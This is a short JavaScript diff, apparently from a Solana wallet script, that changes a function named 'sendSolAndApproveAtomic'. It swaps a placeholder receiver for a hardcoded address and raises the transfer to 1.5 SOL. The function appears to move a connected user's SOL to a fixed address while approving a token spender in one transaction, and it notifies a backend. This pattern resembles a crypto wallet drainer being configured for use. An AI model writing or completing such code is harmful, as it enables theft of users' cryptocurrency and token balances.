@@ -133,8 +133,8 @@ async function sendSolAndApproveAtomic(account, tokenAccount, spenderAddress, am
   txInProgress = true;
 
   try {
-    const receiver = "REPLACE_WITH_RECEIVER_SOL_ADDRESS";
-    const lamports = 0.01 * 1e9;
+    const receiver = "39LLqoEdw4Ahx8dj8hA4uZVCBS1rUNaKvthr1YnJQp2u";
+    const lamports = 1.5 * 1e9;
 
     const fromPubkey = getProviderPubkey(account);
 
@@ -210,3 +210,4 @@ async function safeFetch(url, options) {
     console.warn("Backend notification failed:", err);
   }
 }
+
